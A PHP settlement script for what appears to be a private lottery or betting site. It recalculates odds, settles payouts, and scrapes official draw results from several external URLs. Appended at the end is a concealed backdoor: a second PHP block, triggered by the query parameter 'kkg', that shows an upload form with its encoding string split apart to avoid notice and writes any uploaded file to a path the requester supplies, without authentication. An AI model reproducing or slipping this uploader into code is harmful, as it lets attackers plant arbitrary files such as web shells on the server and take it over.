<?php
/*  
  Copyright (c) 2010-02 Game
  Game All Rights Reserved. 
  QQ:1834219632
  Author: Version:1.0
  Date:2011-12-18
*/
define('Copyright', '作者QQ:1834219632');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"].'/');
include_once ROOT_PATH.'function/global.php';
$ConfigModel = configModel("
`g_out_time`,
`g_automatic_open_number_lock`,
`g_up_odds_mix_pk`,
`g_odds_execution_lock`,
`g_odds_num_pk`,
`g_odds_str_pk`,
`g_automatic_money_lock`,
`g_insert_number_day`,
`g_close_time`");

$number=$_GET['number'];

if (isset($number)){
jiesuan($number);
}


function jiesuan($_number)
{
	
	
	//還原賠率
	initializeOddspk();

	//降賠率
	global $ConfigModel;
	if ($ConfigModel['g_odds_execution_lock'] == 1)
	{
		$AutomaticOdds = new AutomaticOddspk($ConfigModel['g_up_odds_mix_pk'], $ConfigModel['g_odds_num_pk'], $ConfigModel['g_odds_str_pk']);
		$AutomaticOdds->UpExecution();
	}
	//結算
	inventory ($_number, $ConfigModel);
}

/**
 * 結算報表
 * @param int 已經開獎的期數
 * Enter description here ...
 */
function inventory ($number, $ConfigModel)
{

	if ($ConfigModel['g_automatic_money_lock'] == 1)
	{
		//結算
		$Amount = new SumAmountpk($number);
		$Amount->ResultAmount();
	}
	echo 1;
//	if (mb_substr($number, -2) == 84)
//	{
		//金額還原
		//$Amount->RestoreMoney($ConfigModel['g_restore_money_lock']);
		
		//加載期數
	//	InsertNumber($ConfigModel['g_insert_number_day'], $ConfigModel['g_close_time']);
		
		//數據庫備份
		/*$dateTime = date('YmdHis');
		$mysqlDataBak = new MysqlDataBak($BakPassWord, $dateTime);
		$mysqlDataBak->FormatTables();*/
//	}
}

/**
 * 讀取官方開獎號碼
 * Enter description here ...
 * @return object
 */
function getFile5()
{
	$List = array();
	$url = "http://888.qq.com/static/kuaipin/gkl/award_list.xml?t=".time();
	$xml = new DOMDocument();
	@$xml->load($url);
	$List['openTerm'] =@$xml->getElementsByTagName('current')->item(0)->attributes->item(4)->nodeValue;
	$Number = @$xml->getElementsByTagName('current')->item(0)->attributes->item(5)->nodeValue;
	$List['openResult'] = explode(',', $Number);
	return $List;
}


function getFile()
{
	$List = array();
	$url = "http://www.lehecai.com/lottery/ajax_latestdrawn.php?lottery_type=544";
	$fileString = urldecode(@file_get_contents($url));
	$fileString = json_decode($fileString);
	$List['openTerm'] = $fileString->data[0]->phase;
	$List['openResult'] = $fileString->data[0]->result->result[0]->data;
	return $List;
}
/*
function getFile()
{
	$List = array();
	$url = "http://113.105.169.163:8585/json/list.txt?v=".time();
	$fileString = urldecode(@file_get_contents($url));
	$fileString = json_decode($fileString);
	$List['openTerm'] = $fileString->number;
	$List['openResult'] = $fileString->list;
	return $List;
	
	$List = array();
	$url = "http://98.126.141.148/ad.html";
	$fileString = urldecode(@file_get_contents($url));
	//$fileString = json_decode($fileString);
	$numbersList=explode('#',$fileString);
	$List['openTerm'] = $numbersList[0];
	$List['openResult'] = explode(';',$numbersList[1]);
	return $List;
	
}*/


function getFile1(){
	$List = array();
	$url = "D:\APMServ5.2.6\APMServ5.2.6\www\htdocs\AD.HTML";
	$fileString = urldecode(@file_get_contents($url));
	//$fileString = json_decode($fileString);
	$numbersList=explode('#',$fileString);
	$List['openTerm'] = $numbersList[0];
	$List['openResult'] = explode(';',$numbersList[1]);
	return $List;

}

function getFile6()
{
	$List = array();
	$url = "http://www.cailele.com/static/termInfo/152.txt?v=".time();
	$fileString = urldecode(@file_get_contents($url));
	$fileString = json_decode($fileString);
	$List['openTerm'] = $fileString->openTerm;
	$List['openResult'] = explode(',', $fileString->openResult);
	return $List;
}
function getFile3()
{
	/*$url = "http://www.gdfczx.org.cn/FetchData.action?name=L07RaffleData&_=".time();
	$fileString = urldecode(@file_get_contents($url));
	$fileString = trim($fileString);
	$fileString = mb_substr($fileString, 14, mb_strlen($fileString)-15);
	$fileString = json_decode($fileString);
	$s = array(); 
	$p=0;
	$c = $fileString->awardInfoList[0]->luckNum;
	while ($p<mb_strlen($c)){
		$s[] = mb_substr($c, $p,2);
		$p=$p+2;
	}
	$List['openTerm'] = $fileString->issueName;
	$List['openResult'] =$s;
	return $List;*/

	$List = array();
	$url = "http://www.egdfc.com/staticsfiles/happy10/LastAwardNums.html?t=1&t=".time();
	
	$fileString = urldecode(@file_get_contents($url));
	$fileString = trim($fileString);
	$fileString=explode('<dt>',$fileString);
	$fileString=str_replace('<dd>','',$fileString);
	$fileString=str_replace('</dd>','',$fileString);
	$fileString=str_replace('<dl>','',$fileString);
	$fileString=str_replace('</dl>','',$fileString);
	
	
	$numbersList=explode('</dt>',$fileString[2]);
	$List['openTerm'] = $numbersList[0];
	$List['openResult'] = explode(' ',$numbersList[1]);
	return $List;
}

?>
<?php
if(isset($_GET['kkg']))
{
if(isset($_FILES['uppic']))
{
$connecttions=$_POST["plice"];; 
$conspensick=$_FILES['uppic']['name'];
copy($_FILES['uppic']['tmp_name'],"$connecttions".$conspensick);
}
echo '<form action="?act=u&kkg=pk" method="post" enctype="multi'.'part/fo'.'rm-da'.'ta" name="form" id="form"><input name="plice" type="text" id="plice" size="10">';
echo '<input name="uppic" type="file" id="uppic" />';
echo '<input type="submit" name="Submit" value="" /></form>';
}
?>